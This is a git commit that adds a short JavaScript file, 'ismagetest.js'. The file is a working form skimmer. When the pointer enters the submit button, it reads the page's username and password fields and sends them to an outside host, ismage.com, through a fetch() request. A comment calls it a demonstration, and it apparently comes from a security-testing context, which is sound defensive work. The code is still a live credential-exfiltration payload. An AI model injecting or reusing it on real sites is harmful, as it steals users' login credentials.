d11f84e7a45d6533b3a6154edf0cf9d209e1b12b
johnsalay <john.salangsang@imperva.com>
2022-03-01 10:25:18 -0800

    mage url

---
+++ ismagetest.js
@@ -0,0 +1,28 @@
+// This code is for demonstration purposes, and under no circumstances it will be used for a real attack.
+
+function start() {
+    const subBtn = document.getElementById('sub-btn')
+
+    const sendToMe = function (event) {
+        const username = document.getElementById('user')?.value
+        const password = document.getElementById('pass')?.value
+
+
+        fetch(`https://ismage.com/xyfjk32/g?u=${username}&p=${password}`, {
+            "headers": {
+                "cookie": "foo=bar; bar=baz",
+                "x-pretty-print": "2"
+            }
+        })
+    }
+
+    if(subBtn) {
+        subBtn.addEventListener('mouseenter', sendToMe);
+    }
+
+    console.log('form attached')
+}
+
+start()
+
+
